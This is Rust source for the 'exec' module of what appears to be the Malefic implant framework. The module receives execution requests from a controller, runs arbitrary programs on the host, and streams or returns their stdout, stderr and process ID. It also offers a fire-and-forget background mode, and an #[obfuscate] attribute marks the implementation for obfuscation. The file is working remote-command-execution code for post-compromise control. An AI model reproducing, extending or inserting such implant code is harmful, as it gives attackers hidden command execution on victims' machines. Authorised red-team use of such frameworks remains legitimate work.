use futures::channel::mpsc::{self, UnboundedReceiver, UnboundedSender};
use futures::{AsyncReadExt, FutureExt, SinkExt};
use futures_timer::Delay;
use std::time::Duration;

use crate::prelude::*;
use malefic_process::{async_command, run_command};
use malefic_proto::proto::modulepb::ExecResponse;

pub struct Exec {}

#[derive(Debug)]
enum OutputData {
    Stdout(Vec<u8>),
    Stderr(Vec<u8>),
}

// Asynchronously read pipe data and send to channel
async fn read_pipe_async<R: AsyncReadExt + Unpin + Send>(
    mut reader: R,
    sender: UnboundedSender<OutputData>,
    is_stdout: bool,
) {
    let mut buffer = vec![0; 4096];

    loop {
        match reader.read(&mut buffer).await {
            Ok(0) => break, // EOF
            Ok(n) => {
                let data = buffer[..n].to_vec();
                let output = if is_stdout {
                    OutputData::Stdout(data)
                } else {
                    OutputData::Stderr(data)
                };

                if sender.unbounded_send(output).is_err() {
                    break; // Channel closed
                }
            }
            Err(_) => break, // Read error
        }
    }
}

#[async_trait]
#[module_impl("exec")]
impl Module for Exec {}

#[async_trait]
#[obfuscate]
impl malefic_module::ModuleImpl for Exec {
    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_module::Input,
        sender: &mut malefic_module::Output,
    ) -> malefic_module::ModuleResult {
        let request = check_request!(receiver, Body::ExecRequest)?;
        let mut exec_response = ExecResponse::default();

        if request.realtime && request.output {
            // Mode 1: Realtime streaming — send output chunks every second
            let mut child = async_command(request.path, request.args)?;
            let stdout = child.stdout.take().unwrap();
            let stderr = child.stderr.take().unwrap();
            let pid = child.id();

            let (sender_ch, mut receiver_ch) = mpsc::unbounded::<OutputData>();
            let stdout_task = read_pipe_async(stdout, sender_ch.clone(), true);
            let stderr_task = read_pipe_async(stderr, sender_ch, false);
            let background_task = async {
                futures::join!(stdout_task, stderr_task);
            }
            .fuse();
            futures::pin_mut!(background_task);

            let collect_data =
                |receiver: &mut UnboundedReceiver<OutputData>| -> (Vec<u8>, Vec<u8>) {
                    let (mut stdout_data, mut stderr_data) = (Vec::new(), Vec::new());
                    while let Ok(Some(data)) = receiver.try_next() {
                        match data {
                            OutputData::Stdout(data) => stdout_data.extend_from_slice(&data),
                            OutputData::Stderr(data) => stderr_data.extend_from_slice(&data),
                        }
                    }
                    (stdout_data, stderr_data)
                };

            loop {
                futures::select! {
                    _ = Delay::new(Duration::from_secs(1)).fuse() => {
                        let (stdout_data, stderr_data) = collect_data(&mut receiver_ch);

                        if !stdout_data.is_empty() || !stderr_data.is_empty() {
                            let response = ExecResponse {
                                pid,
                                stdout: stdout_data,
                                stderr: stderr_data,
                                end: false,
                                ..Default::default()
                            };
                            sender.send(TaskResult::new_with_body(id, Body::ExecResponse(response))).await?;
                        }
                    }
                    _ = background_task => {
                        let (stdout_data, stderr_data) = collect_data(&mut receiver_ch);
                        let status_code = child.try_status().ok().flatten().map(|s| s.code().unwrap_or(0)).unwrap_or(-1);

                        let response = ExecResponse {
                            pid,
                            stdout: stdout_data,
                            stderr: stderr_data,
                            status_code,
                            ..Default::default()
                        };
                        sender.send(TaskResult::new_with_body(id, Body::ExecResponse(response))).await?;
                        break;
                    }
                }
            }
        } else if request.realtime {
            let child = run_command(request.path, request.args)?;
        } else if request.output {
            // Mode 2: Wait for process, collect all output at once
            let child = async_command(request.path, request.args)?;
            exec_response.pid = child.id();
            let output = child.output().await?;
            exec_response.status_code = output.status.code().unwrap_or(0);
            exec_response.stdout = output.stdout;
            exec_response.stderr = output.stderr;
        } else {
            // Mode 3: Fire-and-forget background execution, return PID only
            let child = async_command(request.path, request.args)?;
            exec_response.pid = child.id();
            exec_response.status_code = 0;
        }

        exec_response.end = true;
        Ok(TaskResult::new_with_body(
            id,
            Body::ExecResponse(exec_response),
        ))
    }
}
